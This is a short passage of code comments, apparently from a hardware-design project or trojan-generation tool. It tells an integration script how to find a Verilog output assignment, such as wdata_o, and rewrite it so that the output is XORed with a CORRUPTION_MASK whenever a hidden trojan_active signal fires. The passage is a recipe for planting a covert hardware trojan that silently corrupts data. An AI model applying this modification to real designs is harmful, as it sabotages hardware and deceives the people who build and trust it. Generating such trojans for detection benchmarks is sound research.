...
//
// IMPORTANT: wdata_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If wdata_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for wdata_o (or first output assign):
//     assign wdata_o = <expr>;
//   Replace with:
//     assign wdata_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
